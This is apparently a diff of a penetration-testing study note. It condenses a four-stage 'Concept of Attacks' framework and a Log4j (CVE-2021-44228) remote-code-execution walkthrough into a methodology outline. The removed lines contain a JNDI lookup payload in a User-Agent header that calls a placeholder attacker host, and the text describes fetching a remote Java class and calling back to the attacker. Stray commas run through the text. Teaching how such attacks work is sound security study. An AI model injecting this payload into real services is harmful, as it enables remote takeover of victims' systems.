@@ -1,101 +1,74 @@
-# Concept of Attacks Framework
+# Methodology
 
-The **Concept of Attacks** is a structured methodology used to analyze, understand, and debug exploits across various services (e.g., **SSH**, **FTP**, **SMB**, **HTTP**). It provides a linear pattern to identify attack points by categorizing every vulnerability into four distinct stages,,.
-
----
-
-### 1. Source
-
-The **Source** is the origin of information or the specific request that triggers a vulnerability. This is the primary target for manipulation during an exploit,.
-
-|Information Source|Description|
-|:--|:--|
-|**Code**|Results from already executed program code or functions.|
-|**Libraries**|Resource collections (configuration, subroutines, classes) integrated into a program.|
-|**Config**|Static values determining how a process handles information.|
-|**APIs**|Interfaces used for retrieving or providing information between programs.|
-|**User Input**|Manual entry of values by a person into a program function.|
+1. **Analyze Source**: Identify where information enters the task cycle (Code, Libraries, Config, APIs, or User Input),.
+2. **Evaluate Process**: Map how data is handled by looking at PID privileges, input functions, variables, and logging triggers.
+3. **Check Privileges**: Determine the execution context (System/root, User, Groups, Policies, or Rules) to define the impact.
+4. **Identify Destination**: Track where data is stored or forwarded (Local files or Network interfaces) to confirm the exploit goal.
+5. **Cycle Iteration**: If the Destination provides new information to a subsequent process, repeat the analysis for multi-stage attacks,.
 
 ---
 
-### 2. Processes
+## Source Manipulation
 
-The **Process** handles information forwarded from the **Source**. Vulnerabilities typically reside in the program code (classes, calculations, loops) that dictates how this data is processed.
+Identifying and exploiting the entry point where information is passed to a process.
 
-|Component|Description|
-|:--|:--|
-|**PID**|The Process-ID identifies the running task and its associated privileges.|
-|**Input**|Information assigned by a user or a programmed function.|
-|**Data Processing**|Hard-coded functions that dictate how information is manipulated.|
-|**Variables**|Placeholders used for further processing during a task.|
-|**Logging**|Documentation of events stored in registers or files; often stays in the system.|
-
----
-
-### 3. Privileges
-
-**Privileges** are system-controlled permissions that determine what actions a process can perform. Attackers look for processes running with high privileges to achieve maximum system impact.
-
-|Privilege Level|Description|
-|:--|:--|
-|**System**|Highest level (Windows: **SYSTEM**, Linux: **root**). Allows any modification.|
-|**User**|Permissions assigned to a specific user account.|
-|**Groups**|Categorization of users sharing specific permissions.|
-|**Policies**|Application-specific commands applied to users or groups.|
-|**Rules**|Permissions handled internally within an application.|
-
----
-
-### 4. Destination
-
-The **Destination** is the goal of the task, where data is either stored or forwarded. This can be local or remote.
-
-|Destination|Description|
-|:--|:--|
-|**Local**|Environmental changes, such as modifying local files or records.|
-|**Network**|Forwarding results to a remote interface, IP address, or service.|
-
----
-
-### Operational Workflow: Log4j Case Study (CVE-2021-44228)
-
-This workflow demonstrates how the framework is applied to a real-world **Remote Code Execution (RCE)** vulnerability.
-
-**Initial Exploitation Cycle:**
-
-1. **Manipulate Source:** Inject a **JNDI lookup** command into the **HTTP User-Agent header**,.
-2. **Trigger Process:** The Log4j library misinterprets the string. Instead of logging it as text, it executes the command,.
-3. **Leverage Privileges:** The command executes with **administrator/SYSTEM** privileges because the logging process requires high-level access to sensitive log locations,.
-4. **Reach Destination:** The process performs a query to a remote server controlled by the attacker,.
-
-**Second Cycle (RCE):**
-
-1. **New Source:** The malicious Java class retrieved from the attacker's server becomes the new **Source**.
-2. **New Process:** The system reads and executes the malicious code within the Java class.
-3. **Execute with Privileges:** The code runs with the existing **administrator** permissions.
-4. **Final Destination:** The code establishes a connection back to the attacker over the network, providing remote control of the target.
-
-### Command Reference Template
-
-_Note: Use this structure when analyzing or testing JNDI-based lookups._
-
-|Parameter|Placeholder|
-|:--|:--|
-|Attacker Server|`<ATTACK_IP>`|
-|Victim Machine|`<TARGET_IP>`|
-|Target Port|`<PORT>`|
-
-**Conceptual Command Structure:**
+Modify specific request headers to pass malicious commands to internal libraries,
 
 ```
-# Example of a JNDI lookup payload in a User-Agent header
-User-Agent: ${jndi:ldap://<ATTACK_IP>:<PORT>/Exploit}
+User-Agent: <JNDI_LOOKUP>
 ```
+
+- **Dangerous / misconfigured settings**
+    
+    - Processing unsanitized manual entry via User Input.
+    - Using results from previously executed program Code as a trusted information source.
+    - Relying on static or prescribed values in Config files that determine process behavior.
+- **Edge cases**
+    
+    - Vulnerabilities in Libraries (e.g., Log4j) can affect any software product integrating their classes and functions.
+- **Gotchas**
+    
+    - **Destination as new Source** occurs when the initial task completion serves as the starting point for a subsequent malicious cycle,.
 
 ---
 
-### Attack Implications
+## Process & Privilege Analysis
 
-- **Methodology Use:** Apply this template to **source code analysis** to check functionality and commands step-by-step.
-- **Decision Making:** Use the **Privileges** and **Destination** categories to prioritize which services to attack based on the potential for **SYSTEM** access or **Network** pivoting,.
-- **Dangerous Configuration:** Applications running with **administrator** privileges to facilitate logging (as seen in Log4j) create high-impact targets for RCE.
+Determining how information is misinterpreted and the permissions assigned to the executing process,.
+
+Analyze the data processing logic to find where input is handled as executable code rather than strings,
+
+```
+<DATA_PROCESSING_FUNCTION>
+```
+
+- **Dangerous / misconfigured settings**
+    
+    - Administrative or **SYSTEM/root** privileges assigned to logging or sensitive data processes,.
+    - Misinterpretation of strings that leads to the execution of a request.
+    - Hard-coded functions in Data processing that fail to validate variables.
+- **Gotchas**
+    
+    - **Privilege mismatch** occurs if the process does not satisfy the conditions required by the system, causing the requested action to be rejected.
+    - **Admin logging permissions** often allow user-supplied code to execute with the highest level of system control.
+
+---
+
+## Destination Exploitation
+
+Confirming the final target or forwarding point of the manipulated task.
+
+Redirect process output or requests to a remote server for RCE,
+
+```
+<TARGET_IP>:<PORT>
+```
+
+- **Edge cases**
+    
+    - Destination can be Local (files/records) or Network-based (remote interfaces/IPs).
+- **Gotchas**
+    
+    - **Network-to-Source loop** triggers when a remote query retrieves a malicious class that is then used as a source for further process execution,.
+
+> ⚠️ Gap: Source lacks specific tools or syntax for intercepting/modifying HTTP headers (e.g., Burp Suite) and lacks instructions for standing up the remote listener/LDAP server required to complete the JNDI lookup.
